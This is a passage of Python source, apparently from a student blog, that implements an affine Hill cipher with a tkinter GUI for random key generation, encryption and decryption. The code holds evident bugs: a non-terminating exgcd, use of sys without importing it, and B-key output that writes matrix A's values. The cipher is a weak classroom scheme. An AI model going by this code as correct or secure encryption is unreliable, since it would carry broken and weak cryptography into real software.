class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> tkinter <span class="keyword">as</span> tk</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> tkinter.simpledialog <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a%b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> b</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">return</span> gcd(b,a%b)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exgcd</span><span class="params">(a,b,x,y)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> b==<span class="number">0</span>:</span><br><span class="line">        x=<span class="number">1</span></span><br><span class="line">        y=<span class="number">0</span></span><br><span class="line">    d = exgcd(b,a%b,y,x)</span><br><span class="line">    y = y - (a/b)*x</span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">InverseElement</span><span class="params">(b,p)</span>:</span><span class="comment">#求逆元</span></span><br><span class="line">    inv = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> (inv*b)%p == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        inv = inv +<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> inv</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Det</span><span class="params">(a,n)</span>:</span><span class="comment">#求行列式</span></span><br><span class="line">    b = np.zeros((n, n))<span class="comment">#临时数组用于降阶</span></span><br><span class="line">    sum = int(<span class="number">0</span>)</span><br><span class="line">    sign = int(<span class="number">0</span>)</span><br><span class="line">    p = int(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> a[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):<span class="comment">#此处大循环实现将余子式存入数组b中</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> range(n<span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(n<span class="number">-1</span>):</span><br><span class="line">                <span class="keyword">if</span> c&lt;i:</span><br><span class="line">                    p = <span class="number">0</span><span class="comment">#当p=0时，行列式只向左移，即消去对应的第一列的数</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    p = <span class="number">1</span><span class="comment">#否则行列式左移后再上移</span></span><br><span class="line">                b[c][j]=a[c+p][j+<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> i%<span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            sign = <span class="number">1</span><span class="comment">#i为偶数，加法</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            sign = <span class="number">-1</span><span class="comment">#i为奇数，减法</span></span><br><span class="line">        sum = sum + a[i][<span class="number">0</span>]*Det(b,n<span class="number">-1</span>)*sign<span class="comment">#计算行列式的值</span></span><br><span class="line">    <span class="keyword">return</span>  sum</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getAStart</span><span class="params">(arcs,n,ans)</span>:</span><span class="comment">#计算每一行每一列的每个元素所对应的余子式，组成A*</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        ans[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">    temp = np.zeros((n, n))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(n):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(n<span class="number">-1</span>):</span><br><span class="line">                <span class="keyword">for</span> t <span class="keyword">in</span> range(n<span class="number">-1</span>):</span><br><span class="line">                    temp[k][t] = arcs[(k+<span class="number">1</span> <span class="keyword">if</span> k&gt;=i <span class="keyword">else</span> k)][(t+<span class="number">1</span> <span class="keyword">if</span> t&gt;=j <span class="keyword">else</span> t)]</span><br><span class="line">                ans[j][i] = Det(temp,n<span class="number">-1</span>)</span><br><span class="line">                <span class="keyword">if</span> (i+j)%<span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">                    ans[j][i] = -ans[j][i]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">InverseMat</span><span class="params">(a,n,p,ans)</span>:</span></span><br><span class="line">    astar = np.zeros((n, n))</span><br><span class="line">    getAStart(a, n, astar)<span class="comment">#求A的伴随矩阵</span></span><br><span class="line">    deta = int(Det(a,n))<span class="comment">#求A的行列式</span></span><br><span class="line">    <span class="keyword">if</span> deta &lt; <span class="number">0</span>:</span><br><span class="line">        deta = deta + p</span><br><span class="line">    inv = int(InverseElement(deta,p))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(n):</span><br><span class="line">            ans[i][j] = astar[i][j]*inv</span><br><span class="line">            ans[i][j] = ans[i][j]%p</span><br><span class="line">            <span class="keyword">if</span> ans[i][j] &lt;<span class="number">0</span>:</span><br><span class="line">                ans[i][j] = ans[i][j] + p</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AtoN</span><span class="params">(A)</span>:</span><span class="comment">#处理字符和数字的关系</span></span><br><span class="line">    N = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span>(ord(A)&gt;=<span class="number">65</span> <span class="keyword">and</span> ord(A)&lt;=<span class="number">90</span>):</span><br><span class="line">        N = ord(A) - ord(<span class="string">'A'</span>)</span><br><span class="line">    <span class="keyword">if</span> (ord(A) &gt;= <span class="number">97</span> <span class="keyword">and</span> ord(A) &lt;= <span class="number">122</span>):</span><br><span class="line">        N = ord(A) - ord(<span class="string">'a'</span>)</span><br><span class="line">    <span class="keyword">return</span> N</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">NtoA</span><span class="params">(N)</span>:</span></span><br><span class="line">    A = chr(N + ord(<span class="string">'A'</span>))</span><br><span class="line">    <span class="keyword">return</span> A</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Encrypt</span><span class="params">(clearlist,A,B,n,N)</span>:</span><span class="comment">#加密函数</span></span><br><span class="line">    CipherText = []</span><br><span class="line">    lenth = len(clearlist)</span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    offset = <span class="number">0</span></span><br><span class="line">    <span class="comment">#补位操作</span></span><br><span class="line">    <span class="keyword">if</span>(lenth%n == <span class="number">0</span>):</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag = <span class="number">1</span></span><br><span class="line">        offset = n-lenth%n</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(offset):</span><br><span class="line">        clearlist.append(<span class="string">'A'</span>)</span><br><span class="line">    groups = int(len(clearlist)/n)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(clearlist)):</span><br><span class="line">        clearlist[i] = AtoN(clearlist[i])</span><br><span class="line">    <span class="comment">#生成M序列</span></span><br><span class="line">    M = np.ones((groups,n))</span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> range(groups):</span><br><span class="line">        <span class="keyword">for</span> column <span class="keyword">in</span> range(n):</span><br><span class="line">            M[row][column] = clearlist[index]</span><br><span class="line">            index = index + <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(groups):<span class="comment">#实现矩阵乘法和矩阵加法，A*M+Bmod(N)</span></span><br><span class="line">        tmp = np.zeros((n, <span class="number">1</span>))</span><br><span class="line">        tmpp = np.zeros((n, <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> range(n):<span class="comment">#初始化Mi</span></span><br><span class="line">            tmp[row][<span class="number">0</span>] = M[i][row]</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> range(n):<span class="comment">#实现A*M</span></span><br><span class="line">            <span class="keyword">for</span> column <span class="keyword">in</span> range(n):</span><br><span class="line">                tmpp[row][<span class="number">0</span>] = int(tmpp[row][<span class="number">0</span>] + (int(tmp[column][<span class="number">0</span>]) * int(A[row][column])))</span><br><span class="line">            tmpp[row][<span class="number">0</span>] = int((tmpp[row][<span class="number">0</span>]) % N)</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> range(n):<span class="comment">#实现+</span></span><br><span class="line">            tmpp[row][<span class="number">0</span>] = (tmpp[row][<span class="number">0</span>] + B[row][<span class="number">0</span>]) % N</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> range(n):</span><br><span class="line">            CipherText.append(NtoA(int(tmpp[row][<span class="number">0</span>])))</span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(offset):<span class="comment">#消除补位影响</span></span><br><span class="line">            <span class="keyword">del</span> CipherText[<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> CipherText</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decrypt</span><span class="params">(CipherText,A,B,n,N)</span>:</span><span class="comment">#解密函数</span></span><br><span class="line">    clearlist = []</span><br><span class="line">    lenth = len(CipherText)</span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    offset = <span class="number">0</span></span><br><span class="line">    <span class="comment"># 补位操作</span></span><br><span class="line">    <span class="keyword">if</span> (lenth % n == <span class="number">0</span>):</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag = <span class="number">1</span></span><br><span class="line">        offset = n - lenth % n</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(offset):</span><br><span class="line">        CipherText.append(<span class="string">'A'</span>)</span><br><span class="line">    groups = int(len(CipherText) / n)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(CipherText)):</span><br><span class="line">        CipherText[i] = AtoN(CipherText[i])</span><br><span class="line">    <span class="comment"># 生成M序列</span></span><br><span class="line">    M = np.zeros((groups, n))</span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> range(groups):</span><br><span class="line">        <span class="keyword">for</span> column <span class="keyword">in</span> range(n):</span><br><span class="line">            M[row][column] = CipherText[index]</span><br><span class="line">            index = index + <span class="number">1</span></span><br><span class="line">    <span class="comment">#求C-B</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(groups):<span class="comment">#实现矩阵乘法和矩阵加法，InA*(C-B)</span></span><br><span class="line">        tmp = np.zeros((n, <span class="number">1</span>))</span><br><span class="line">        tmpp = np.zeros((n, <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> range(n):<span class="comment">#初始化Mi</span></span><br><span class="line">            tmp[row][<span class="number">0</span>] = M[i][row]</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> range(n):  <span class="comment"># 实现C-B</span></span><br><span class="line">            tmp[row][<span class="number">0</span>] = tmp[row][<span class="number">0</span>] - B[row][<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> range(n):<span class="comment">#实现InA*(C-B)mod(N)</span></span><br><span class="line">            <span class="keyword">for</span> column <span class="keyword">in</span> range(n):</span><br><span class="line">                tmpp[row][<span class="number">0</span>] = int(tmpp[row][<span class="number">0</span>] + (int(tmp[column][<span class="number">0</span>]) * int(A[row][column])))</span><br><span class="line">            tmpp[row][<span class="number">0</span>] = int((tmpp[row][<span class="number">0</span>]) % N)</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> range(n):</span><br><span class="line">            clearlist.append(NtoA(int(tmpp[row][<span class="number">0</span>])))</span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(offset):<span class="comment">#消除补位影响</span></span><br><span class="line">            <span class="keyword">del</span> clearlist[<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> clearlist</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getIdentityMatrix</span><span class="params">(n)</span>:</span><span class="comment">#生成单位矩阵</span></span><br><span class="line">    A = np.zeros((n,n))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(n):</span><br><span class="line">            <span class="keyword">if</span> i == j:</span><br><span class="line">                A[i][j] = <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                A[i][j] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> A</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getInvertibleMatrix</span><span class="params">(n,m)</span>:</span><span class="comment">#生成可逆矩阵</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        A = getIdentityMatrix(n)</span><br><span class="line">        tempArray = np.zeros(n)</span><br><span class="line">        B = np.zeros((n,n))</span><br><span class="line">        transformTime = int(random.randint(<span class="number">0</span>,<span class="number">1000</span>))</span><br><span class="line">        maxint = sys.maxsize</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(transformTime):</span><br><span class="line">            mainRowNum = int((random.randint(<span class="number">0</span>,n) % (n - <span class="number">1</span>)))<span class="comment">#选择一个主行作初等行变换</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(n):</span><br><span class="line">                <span class="comment">#元素数值是否会溢出</span></span><br><span class="line">                <span class="keyword">if</span> maxint - (A[mainRowNum][k])*(int(random.randint(<span class="number">0</span>,<span class="number">10</span>))) &lt; <span class="number">0</span> <span class="keyword">and</span> maxint*(<span class="number">-1</span>) - (A[mainRowNum][k])*(int(random.randint(<span class="number">0</span>,<span class="number">10</span>))) &gt; tempArray[k]:</span><br><span class="line">                    tempArray[k] = A[mainRowNum][k]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    tempArray[k] = (A[mainRowNum][k]*(int(random.randint(<span class="number">0</span>,<span class="number">10</span>))))%m</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(n):</span><br><span class="line">                <span class="keyword">if</span> mainRowNum != j:</span><br><span class="line">                    <span class="keyword">for</span> k <span class="keyword">in</span> range(n):</span><br><span class="line">                        <span class="keyword">if</span> maxint - A[j][k]&lt; tempArray[k] <span class="keyword">and</span> maxint * (<span class="number">-1</span>) - (A[j][k]) &gt; tempArray[k]:</span><br><span class="line">                            A[j][k] = (A[j][k]/<span class="number">4</span>)%m</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            A[j][k] = (A[j][k] + tempArray[k])%m</span><br><span class="line">        <span class="keyword">if</span> gcd(np.linalg.det(A),m) == <span class="number">1</span> <span class="keyword">and</span> np.linalg.det(A) &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> A</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nnb</span><span class="params">()</span>:</span></span><br><span class="line">    messagebox.showinfo(<span class="string">"Succesfull"</span>, <span class="string">"File is in your computer!"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">newwind</span><span class="params">(n,m)</span>:</span></span><br><span class="line">    winNew = Toplevel(window)</span><br><span class="line">    winNew.geometry(<span class="string">'320x400'</span>)</span><br><span class="line">    winNew.title(<span class="string">'Random Key'</span>)</span><br><span class="line">    lb1 = tk.Label(winNew, text=<span class="string">'Random A Key'</span>, font=(<span class="string">'Arial'</span>, <span class="number">16</span>), width=<span class="number">40</span>, height=<span class="number">2</span>)</span><br><span class="line">    lb1.pack(fill=<span class="string">'x'</span>)</span><br><span class="line">    nt1 = tk.Text(winNew, height=<span class="number">8</span>, width=<span class="number">40</span>)</span><br><span class="line">    nt1.pack(fill=<span class="string">'x'</span>)</span><br><span class="line">    lb2 = tk.Label(winNew, text=<span class="string">'Random B Key'</span>, font=(<span class="string">'Arial'</span>, <span class="number">16</span>), width=<span class="number">40</span>, height=<span class="number">2</span>)</span><br><span class="line">    lb2.pack(fill=<span class="string">'x'</span>)</span><br><span class="line">    nt2 = tk.Text(winNew, height=<span class="number">8</span>, width=<span class="number">40</span>)</span><br><span class="line">    nt2.pack(fill=<span class="string">'x'</span>)</span><br><span class="line">    nb = tk.Button(winNew, text=<span class="string">'Save'</span>, font=(<span class="string">'Arial'</span>, <span class="number">12</span>), width=<span class="number">10</span>, height=<span class="number">1</span>, command=nnb)</span><br><span class="line">    nb.pack()</span><br><span class="line">    lb3 = tk.Label(winNew, text=<span class="string">'@FZU-IS-404 ZERO-A-ONE'</span>, font=(<span class="string">'Arial'</span>, <span class="number">10</span>), width=<span class="number">40</span>, height=<span class="number">2</span>)</span><br><span class="line">    lb3.pack(fill=<span class="string">'x'</span>)</span><br><span class="line">    B = np.zeros((n, <span class="number">1</span>))</span><br><span class="line">    A = getInvertibleMatrix(n,m)</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> range(n):</span><br><span class="line">        B[row] = int(random.randint(<span class="number">0</span>, <span class="number">26</span>))</span><br><span class="line">    At = open(<span class="string">'A_key.txt'</span>, <span class="string">'w'</span>)</span><br><span class="line">    Bt = open(<span class="string">'B_key.txt'</span>, <span class="string">'w'</span>)</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> range(n):</span><br><span class="line">        str1 = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> range(n):</span><br><span class="line">            str1 += str(int(A[row][line]))</span><br><span class="line">            str1 += <span class="string">' '</span></span><br><span class="line">        str1 += <span class="string">"\n"</span></span><br><span class="line">        At.write(str1)</span><br><span class="line">        nt1.insert(<span class="string">"%d.%d"</span> % (<span class="number">0</span>, int(row)),str1)</span><br><span class="line">    At.close()</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> range(n):</span><br><span class="line">        str2 = <span class="string">""</span></span><br><span class="line">        str2 += str(int(A[row][<span class="number">0</span>]))</span><br><span class="line">        str2 += <span class="string">"\n"</span></span><br><span class="line">        Bt.write(str2)</span><br><span class="line">        nt2.insert(<span class="string">"%d.%d"</span> % (<span class="number">0</span>, int(row)), str2)</span><br><span class="line">    Bt.close()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nb1</span><span class="params">()</span>:</span></span><br><span class="line">    fo = open(<span class="string">"text.txt"</span>, <span class="string">"r+"</span>)</span><br><span class="line">    str = fo.read()</span><br><span class="line">    tt2.insert(INSERT, str)</span><br><span class="line">    fo.close()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buttonRK</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> e1.get() != <span class="string">""</span> <span class="keyword">and</span> e2.get() != <span class="string">""</span>:</span><br><span class="line">        n = int(e1.get())</span><br><span class="line">        m = int(e2.get())</span><br><span class="line">        newwind(n,m)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        messagebox.showinfo(<span class="string">"Error"</span>, <span class="string">"Please input n"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">n2wind</span><span class="params">(ans,n)</span>:</span></span><br><span class="line">    n2wind = Toplevel(window)</span><br><span class="line">    n2wind.geometry(<span class="string">'300x130'</span>)</span><br><span class="line">    n2wind.title(<span class="string">'Inverse Matrix'</span>)</span><br><span class="line">    n2nt2 = tk.Text(n2wind, height=<span class="number">8</span>, width=<span class="number">40</span>)</span><br><span class="line">    n2nt2.pack(fill=<span class="string">'x'</span>)</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> range(n):</span><br><span class="line">        str1 = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> range(n):</span><br><span class="line">            str1 += str(int(ans[row][line]))</span><br><span class="line">            str1 += <span class="string">' '</span></span><br><span class="line">        str1 += <span class="string">"\n"</span></span><br><span class="line">        n2nt2.insert(<span class="string">"%d.%d"</span> % (<span class="number">0</span>, int(row)),str1)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Dewin</span><span class="params">()</span>:</span><span class="comment">#解密函数GUI</span></span><br><span class="line">    <span class="keyword">if</span> t1.get(<span class="string">"0.0"</span>,<span class="string">"end"</span>) != <span class="string">""</span> <span class="keyword">and</span> t2.get(<span class="string">"0.0"</span>,<span class="string">"end"</span>) != <span class="string">""</span> <span class="keyword">and</span> e1.get() != <span class="string">""</span> <span class="keyword">and</span> e2.get() != <span class="string">""</span>:</span><br><span class="line">        n = int(e1.get())</span><br><span class="line">        m = int(e2.get())</span><br><span class="line">        A = np.zeros((n, n))</span><br><span class="line">        B = np.zeros((n, <span class="number">1</span>))</span><br><span class="line">        InA = np.zeros((n, n))</span><br><span class="line">        Atex = t1.get(<span class="string">"1.0"</span>, <span class="string">"end"</span>)</span><br><span class="line">        stringA = <span class="string">' '</span>.join(Atex.split())</span><br><span class="line">        listA = list(stringA.split(<span class="string">' '</span>))</span><br><span class="line">        index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> range(n):</span><br><span class="line">            <span class="keyword">for</span> column <span class="keyword">in</span> range(n):</span><br><span class="line">                A[row][column] = int(listA[index])</span><br><span class="line">                index = index + <span class="number">1</span></span><br><span class="line">        Btex = t2.get(<span class="string">"1.0"</span>, <span class="string">"end"</span>)</span><br><span class="line">        stringB = <span class="string">' '</span>.join(Btex.split())</span><br><span class="line">        listB = list(stringB.split(<span class="string">' '</span>))</span><br><span class="line">        index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> range(n):</span><br><span class="line">            B[row][<span class="number">0</span>] = int(listB[index])</span><br><span class="line">            index = index + <span class="number">1</span></span><br><span class="line">        clear = tt2.get(<span class="string">"1.0"</span>, <span class="string">"end"</span>)</span><br><span class="line">        clear = list(clear)</span><br><span class="line">        InA = InverseMat(A, n, m, InA)</span><br><span class="line">        klist = np.zeros(len(clear))</span><br><span class="line">        index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(clear)):</span><br><span class="line">            <span class="keyword">if</span> clear[i] == <span class="string">' '</span>:</span><br><span class="line">                klist[index] = int(i)</span><br><span class="line">                index = index + <span class="number">1</span></span><br><span class="line">        dlist = np.zeros(len(clear))</span><br><span class="line">        index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(clear)):</span><br><span class="line">            <span class="keyword">if</span> clear[i] == <span class="string">','</span>:</span><br><span class="line">                dlist[index] = int(i)</span><br><span class="line">                index = index + <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(clear)):</span><br><span class="line">            <span class="keyword">if</span> clear[i] == <span class="string">','</span>:</span><br><span class="line">                clear[i] = <span class="string">' '</span></span><br><span class="line">        <span class="keyword">while</span> <span class="string">' '</span> <span class="keyword">in</span> clear:</span><br><span class="line">            clear.remove(<span class="string">' '</span>)</span><br><span class="line">        print(dlist)</span><br><span class="line">        print(klist)</span><br><span class="line">        clearlist = Decrypt(clear, InA, B, n, m)</span><br><span class="line">        print(clearlist)</span><br><span class="line">        clearlist = list(clearlist)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(klist)):</span><br><span class="line">            <span class="keyword">if</span> klist[i] == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            ind = int(klist[i])</span><br><span class="line">            clearlist.insert(ind, <span class="string">" "</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(dlist)):</span><br><span class="line">            <span class="keyword">if</span> dlist[i] == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            ind = int(dlist[i])</span><br><span class="line">            clearlist.insert(ind, <span class="string">","</span>)</span><br><span class="line">        str = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(clearlist)):</span><br><span class="line">            str += clearlist[i]</span><br><span class="line">        t3.insert(INSERT, str)</span><br><span class="line">        n2wind(InA,n)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        messagebox.showinfo(<span class="string">"Error"</span>, <span class="string">"Please input n,m,A key,B key"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Enwin</span><span class="params">()</span>:</span><span class="comment">#加密函数GUI</span></span><br><span class="line">    <span class="keyword">if</span> t1.get(<span class="string">"0.0"</span>,<span class="string">"end"</span>) != <span class="string">""</span> <span class="keyword">and</span> t2.get(<span class="string">"0.0"</span>,<span class="string">"end"</span>) != <span class="string">""</span> <span class="keyword">and</span> e1.get() != <span class="string">""</span> <span class="keyword">and</span> e2.get() != <span class="string">""</span>:</span><br><span class="line">        n = int(e1.get())</span><br><span class="line">        m = int(e2.get())</span><br><span class="line">        A = np.zeros((n, n))</span><br><span class="line">        B = np.zeros((n, <span class="number">1</span>))</span><br><span class="line">        Atex = t1.get(<span class="string">"1.0"</span>, <span class="string">"end"</span>)</span><br><span class="line">        stringA = <span class="string">' '</span>.join(Atex.split())</span><br><span class="line">        listA = list(stringA.split(<span class="string">' '</span>))</span><br><span class="line">        index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> range(n):</span><br><span class="line">            <span class="keyword">for</span> column <span class="keyword">in</span> range(n):</span><br><span class="line">                A[row][column] = int(listA[index])</span><br><span class="line">                index = index + <span class="number">1</span></span><br><span class="line">        print(A)</span><br><span class="line">        Btex = t2.get(<span class="string">"1.0"</span>, <span class="string">"end"</span>)</span><br><span class="line">        stringB = <span class="string">' '</span>.join(Btex.split())</span><br><span class="line">        listB = list(stringB.split(<span class="string">' '</span>))</span><br><span class="line">        index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> range(n):</span><br><span class="line">            B[row][<span class="number">0</span>] = int(listB[index])</span><br><span class="line">            index = index + <span class="number">1</span></span><br><span class="line">        print(B)</span><br><span class="line">        clear = tt2.get(<span class="string">"1.0"</span>, <span class="string">"end"</span>)</span><br><span class="line">        clear = list(clear)</span><br><span class="line">        klist = np.zeros(len(clear))</span><br><span class="line">        index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(clear)):</span><br><span class="line">            <span class="keyword">if</span> clear[i] == <span class="string">' '</span>:</span><br><span class="line">                klist[index] = int(i)</span><br><span class="line">                index = index + <span 